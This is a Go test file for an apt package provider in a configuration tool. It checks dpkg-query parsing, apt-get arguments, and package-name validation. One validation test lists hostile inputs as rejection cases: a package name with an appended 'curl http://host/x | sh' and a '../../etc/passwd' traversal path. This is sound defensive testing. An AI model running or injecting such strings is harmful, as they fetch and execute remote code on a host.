// SPDX-License-Identifier: Apache-2.0

package apt

import (
	"context"
	"strings"
	"testing"

	"github.com/dsgnr/datum/internal/document"
	"github.com/dsgnr/datum/internal/provider"
	"github.com/dsgnr/datum/internal/run/runtest"
	"github.com/dsgnr/datum/internal/state"
)

// The format string is the contract with dpkg-query, so the tests pin the exact call
// and not just the program name.
const showFormat = `--showformat=${db:Status-Status}\n${Version}\n`

func request(name string, fields map[string]string) provider.Request {
	desired := document.Value{Kind: document.KindMap, Map: map[string]document.Value{}}
	for k, v := range fields {
		desired.Map[k] = document.Scalar(v)
	}
	return provider.Request{
		Ref:     document.Reference{Type: "Package", Name: name},
		Target:  name,
		Desired: desired,
	}
}

func TestObserveInstalledPackage(t *testing.T) {
	runner := runtest.New().Output("installed\n1.24.0-2\n",
		"dpkg-query", showFormat, "--show", "nginx")

	got, err := NewWith(runner).Observe(context.Background(), request("nginx", nil))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Exists {
		t.Error("the package should be reported as installed")
	}
	version, ok := got.Value("version")
	if !ok || version.Scalar != "1.24.0-2" {
		t.Errorf("version = %+v", version)
	}
}

// dpkg-query exits non-zero for a package it has never heard of, which is the ordinary
// case for something not installed, not a failure.
func TestObserveUnknownPackageIsAbsentNotAnError(t *testing.T) {
	runner := runtest.New().Fail(1, "dpkg-query: no packages found matching nginx\n",
		"dpkg-query", showFormat, "--show", "nginx")

	got, err := NewWith(runner).Observe(context.Background(), request("nginx", nil))
	if err != nil {
		t.Fatalf("err = %v, want nil", err)
	}
	if got.Exists {
		t.Error("an unknown package is not installed")
	}
}

// A dpkg that is broken, as opposed to merely ignorant, has to be reported, or the pass
// would install something over the top of a half-configured system.
func TestObserveOtherFailureIsAnError(t *testing.T) {
	runner := runtest.New().Fail(2, "dpkg-query: error: unable to open database\n",
		"dpkg-query", showFormat, "--show", "nginx")

	if _, err := NewWith(runner).Observe(context.Background(), request("nginx", nil)); err == nil {
		t.Fatal("a database failure should not be read as absent")
	}
}

// Removed but not purged still has configuration on disk. For a Package resource it
// is not installed, and the state is recorded so a plan can say why.
func TestObserveRemovedButNotPurged(t *testing.T) {
	runner := runtest.New().Output("config-files\n1.24.0-2\n",
		"dpkg-query", showFormat, "--show", "nginx")

	got, err := NewWith(runner).Observe(context.Background(), request("nginx", nil))
	if err != nil {
		t.Fatal(err)
	}
	if got.Exists {
		t.Error("a package in config-files state is not installed")
	}
	if !strings.Contains(got.Found, "config-files") {
		t.Errorf("Found = %q, want it to name the state", got.Found)
	}
}

func TestInstallWithoutAVersion(t *testing.T) {
	runner := runtest.New()

	err := NewWith(runner).Apply(context.Background(), request("nginx", nil), state.Create)
	if err != nil {
		t.Fatal(err)
	}

	argv, err := runner.Args("apt-get")
	if err != nil {
		t.Fatal(err)
	}
	if argv[len(argv)-1] != "nginx" {
		t.Errorf("argv = %v, want it to end with the bare package name", argv)
	}
	if !contains(argv, "install") || !contains(argv, "--yes") {
		t.Errorf("argv = %v", argv)
	}
}

// Pinning a version has to move a package in either direction, so the version goes
// on the argument and downgrades are allowed.
func TestInstallWithAVersion(t *testing.T) {
	runner := runtest.New()

	err := NewWith(runner).Apply(context.Background(),
		request("nginx", map[string]string{"version": "1.24.0-2"}), state.Update)
	if err != nil {
		t.Fatal(err)
	}

	argv, err := runner.Args("apt-get")
	if err != nil {
		t.Fatal(err)
	}
	if argv[len(argv)-1] != "nginx=1.24.0-2" {
		t.Errorf("argv = %v, want name=version last", argv)
	}
	if !contains(argv, "--allow-downgrades") {
		t.Errorf("argv = %v, want downgrades allowed", argv)
	}
}

// A conffile prompt cannot be answered during a pass, so apt-get is told which way to
// go rather than left to ask.
func TestInstallCannotPrompt(t *testing.T) {
	runner := runtest.New()

	if err := NewWith(runner).Apply(context.Background(), request("nginx", nil), state.Create); err != nil {
		t.Fatal(err)
	}
	argv, err := runner.Args("apt-get")
	if err != nil {
		t.Fatal(err)
	}
	line := strings.Join(argv, " ")
	for _, want := range []string{"--force-confold", "--force-confdef"} {
		if !strings.Contains(line, want) {
			t.Errorf("argv = %v, want %s", argv, want)
		}
	}
}

// Purging deletes configuration Datum did not put there and cannot put back, so absent
// means removed, not purged.
func TestRemoveDoesNotPurge(t *testing.T) {
	runner := runtest.New()

	err := NewWith(runner).Apply(context.Background(),
		request("telnet", map[string]string{"state": "absent"}), state.Remove)
	if err != nil {
		t.Fatal(err)
	}

	argv, err := runner.Args("apt-get")
	if err != nil {
		t.Fatal(err)
	}
	if !contains(argv, "remove") {
		t.Errorf("argv = %v, want remove", argv)
	}
	if contains(argv, "--purge") || contains(argv, "purge") {
		t.Errorf("argv = %v, should not purge", argv)
	}
}

func TestApplyReportsAptFailure(t *testing.T) {
	runner := runtest.New()
	runner.Default = runtest.Reply{Code: 100, Stderr: "E: Unable to locate package nginx\n"}

	err := NewWith(runner).Apply(context.Background(), request("nginx", nil), state.Create)
	if err == nil {
		t.Fatal("want an error")
	}
	if !strings.Contains(err.Error(), "Unable to locate package") {
		t.Errorf("err = %v", err)
	}
}

func TestNoActionRunsNothing(t *testing.T) {
	runner := runtest.New()

	for _, action := range []state.Action{state.None, state.Skip} {
		if err := NewWith(runner).Apply(context.Background(), request("nginx", nil), action); err != nil {
			t.Fatal(err)
		}
	}
	if calls := runner.Calls(); len(calls) != 0 {
		t.Errorf("nothing should have run, got %v", calls)
	}
}

// The runner passes arguments as a vector, so this is not what stops a shell
// metacharacter. It stops a name apt-get would read as an option or as a version.
func TestRejectsNamesThatAreNotPackageNames(t *testing.T) {
	runner := runtest.New()
	p := NewWith(runner)

	for _, name := range []string{
		"",
		"--reinstall",
		"nginx; curl http://host/x | sh",
		"nginx=1.0",
		"../../etc/passwd",
	} {
		if _, err := p.Observe(context.Background(), request(name, nil)); err == nil {
			t.Errorf("Observe accepted %q", name)
		}
		if err := p.Apply(context.Background(), request(name, nil), state.Create); err == nil {
			t.Errorf("Apply accepted %q", name)
		}
	}
	if calls := runner.Calls(); len(calls) != 0 {
		t.Errorf("a rejected name should not reach a program, got %v", calls)
	}
}

func TestRejectsVersionsThatAreNotVersions(t *testing.T) {
	runner := runtest.New()
	p := NewWith(runner)

	for _, version := range []string{"1.0=2.0", "--option", "1.0 2.0"} {
		err := p.Apply(context.Background(),
			request("nginx", map[string]string{"version": version}), state.Create)
		if err == nil {
			t.Errorf("Apply accepted version %q", version)
		}
	}
}

// A real package name can contain characters that look unusual but are valid.
func TestAcceptsRealPackageNames(t *testing.T) {
	for _, name := range []string{"g++", "lib32z1", "python3.11", "linux-image-amd64", "libc6:i386"} {
		if err := validName(name); err != nil {
			t.Errorf("validName(%q) = %v", name, err)
		}
	}
}

func TestTypesAndName(t *testing.T) {
	p := NewWith(runtest.New())
	if p.Name() != "apt" {
		t.Errorf("Name = %q", p.Name())
	}
	if types := p.Types(); len(types) != 1 || types[0] != "Package" {
		t.Errorf("Types = %v", types)
	}
}

func TestSatisfiesTheProviderInterface(t *testing.T) {
	var _ provider.Provider = NewWith(runtest.New())
}

func contains(items []string, want string) bool {
	for _, item := range items {
		if item == want {
			return true
		}
	}
	return false
}
